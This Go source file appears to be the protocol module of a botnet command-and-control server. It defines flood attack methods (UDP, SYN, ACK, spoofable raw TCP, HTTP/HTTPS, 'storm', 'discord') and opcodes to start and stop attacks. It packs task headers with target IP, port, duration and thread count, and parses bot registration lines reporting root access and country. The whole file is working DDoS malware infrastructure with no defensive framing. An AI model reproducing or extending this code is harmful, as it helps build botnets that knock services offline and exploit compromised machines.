// language: Go, file: cnc/internal/protocol/protocol.go
// *1:1 mirror of shared/protocol.h — structs, method/opcode IDs, pack/unpack*
package protocol

import (
	"encoding/binary"
	"errors"
	"strings"
)

const (
	Magic   uint32 = 0xB16B00B5
	Version uint8  = 1
)

// ---- method IDs (must match enum bh_method) ----
const (
	MUDP    uint8 = 0x01
	MTCP    uint8 = 0x02
	MTCPRaw uint8 = 0x03
	MAck    uint8 = 0x04
	MSyn    uint8 = 0x05
	MPps    uint8 = 0x06
	MStorm  uint8 = 0x07
	MHex    uint8 = 0x08
	MDiscord uint8 = 0x09
	MHTTP   uint8 = 0x0A
	MHTTPS  uint8 = 0x0B
)

// ---- opcodes (must match enum bh_opcode) ----
const (
	OpAttack  uint8 = 0x01
	OpStop    uint8 = 0x02
	OpStopAll uint8 = 0x03
	OpPing    uint8 = 0x04
)

// ---- TCP flag bits ----
const (
	TCPSyn uint8 = 0x01
	TCPAck uint8 = 0x02
	TCPRst uint8 = 0x04
	TCPPsh uint8 = 0x08
	TCPAll uint8 = 0x0F
)

// MethodName maps the wire ID back to the console verb.
func MethodName(m uint8) string {
	switch m {
	case MUDP:    return "udp"
	case MTCP:    return "tcp"
	case MTCPRaw: return "tcpraw"
	case MAck:    return "ack"
	case MSyn:    return "syn"
	case MPps:    return "pps"
	case MStorm:  return "storm"
	case MHex:    return "hex"
	case MDiscord:return "discord"
	case MHTTP:   return "http"
	case MHTTPS:  return "https"
	}
	return "unknown"
}

// MethodID maps the console verb to the wire ID.
func MethodID(name string) (uint8, bool) {
	switch strings.ToLower(name) {
	case "udp":     return MUDP, true
	case "tcp":     return MTCP, true
	case "tcpraw":  return MTCPRaw, true
	case "ack":     return MAck, true
	case "syn":     return MSyn, true
	case "pps":     return MPps, true
	case "storm":   return MStorm, true
	case "hex":     return MHex, true
	case "discord": return MDiscord, true
	case "http":    return MHTTP, true
	case "https":   return MHTTPS, true
	}
	return 0, false
}

// Header is the fixed 20-byte bh_task_hdr.
type Header struct {
	Magic    uint32
	Version  uint8
	Opcode   uint8
	Method   uint8
	Duration uint8
	PID      uint32
	TargetIP uint32 // network byte order
	Port     uint16 // host byte order on the wire
	Threads  uint8
	Pad      uint8
}

// HeaderSize is sizeof(struct bh_task_hdr).
const HeaderSize = 20

// TailLen is bh_tail_len (udp, tcp, pps).
type TailLen struct{ Len uint16 }

// TailTcpraw is bh_tail_tcpraw (tcpraw, syn, ack).
type TailTcpraw struct {
	Flags uint8
	TOS   uint8
	Seq   uint32
	Spoof uint8
}

// TailStorm is bh_tail_storm.
type TailStorm struct{ PpsMin, PpsMax uint16 }

// TailHTTP is bh_tail_http followed by path bytes.
type TailHTTP struct {
	Keepalive uint8
	ReqMethod uint8
	PathLen   uint16
	Path      []byte
}

// TailDiscord is bh_tail_discord.
type TailDiscord struct{ Endpoint uint32 } // net order, 0 = resolve from call

// TailSize matches bh_attack_size() minus the header.
func TailSize(method uint8, pathLen uint16) uint32 {
	switch method {
	case MUDP, MTCP, MPps:
		return 2
	case MTCPRaw, MSyn, MAck:
		return 7
	case MStorm:
		return 4
	case MHTTP, MHTTPS:
		return 4 + uint32(pathLen)
	case MDiscord:
		return 4
	case MHex:
		return 0
	}
	return 0
}

// TotalSize matches bh_attack_size().
func TotalSize(method uint8, pathLen uint16) uint32 {
	return HeaderSize + TailSize(method, pathLen)
}

// ---- pack (Go -> wire) ----

// Pack writes hdr into b at offset 0. b must be >= HeaderSize.
func (h *Header) Pack(b []byte) error {
	if len(b) < HeaderSize {
		return errors.New("header buffer too small")
	}
	binary.BigEndian.PutUint32(b[0:], h.Magic)
	b[4] = h.Version
	b[5] = h.Opcode
	b[6] = h.Method
	b[7] = h.Duration
	binary.BigEndian.PutUint32(b[8:], h.PID)
	binary.BigEndian.PutUint32(b[12:], h.TargetIP)
	binary.BigEndian.PutUint16(b[16:], h.Port)
	b[18] = h.Threads
	b[19] = h.Pad
	return nil
}

// Unpack reads a header from b.
func Unpack(b []byte) (*Header, error) {
	if len(b) < HeaderSize {
		return nil, errors.New("short header")
	}
	h := &Header{
		Magic:    binary.BigEndian.Uint32(b[0:]),
		Version:  b[4],
		Opcode:   b[5],
		Method:   b[6],
		Duration: b[7],
		PID:      binary.BigEndian.Uint32(b[8:]),
		TargetIP: binary.BigEndian.Uint32(b[12:]),
		Port:     binary.BigEndian.Uint16(b[16:]),
		Threads:  b[18],
		Pad:      b[19],
	}
	if h.Magic != Magic {
		return nil, errors.New("bad magic")
	}
	if h.Version != Version {
		return nil, errors.New("bad version")
	}
	return h, nil
}

// ---- registration line ----

// RegInfo is the parsed bot registration line.
type RegInfo struct {
	Arch    string
	Cores   int
	RAM     int    // MB
	Rooted  bool
	Country string // 2-letter CC
}

// ParseReg parses "arch=x cores=n ram=n rooted=0|1 country=CC".
func ParseReg(line string) (*RegInfo, error) {
	r := &RegInfo{}
	for _, tok := range strings.Fields(line) {
		kv := strings.SplitN(tok, "=", 2)
		if len(kv) != 2 {
			continue
		}
		switch kv[0] {
		case "arch":
			r.Arch = kv[1]
		case "cores":
			r.Cores = atoiSafe(kv[1])
		case "ram":
			r.RAM = atoiSafe(kv[1])
		case "rooted":
			r.Rooted = kv[1] == "1"
		case "country":
			r.Country = strings.ToUpper(kv[1])
		}
	}
	if r.Arch == "" {
		return nil, errors.New("registration missing arch")
	}
	return r, nil
}

// FormatReg builds the registration line from RegInfo (used by tests / bot stub).
func (r *RegInfo) FormatReg() string {
	rooted := "0"
	if r.Rooted {
		rooted = "1"
	}
	return "arch=" + r.Arch +
		" cores=" + itoaSafe(r.Cores) +
		" ram=" + itoaSafe(r.RAM) +
		" rooted=" + rooted +
		" country=" + r.Country + "\n"
}

func atoiSafe(s string) int {
	n := 0
	for _, c := range s {
		if c < '0' || c > '9' {
			return n
		}
		n = n*10 + int(c-'0')
	}
	return n
}

func itoaSafe(n int) string {
	if n == 0 {
		return "0"
	}
	var buf [12]byte
	i := len(buf)
	for n > 0 {
		i--
		buf[i] = byte('0' + n%10)
		n /= 10
	}
	return string(buf[i:])
}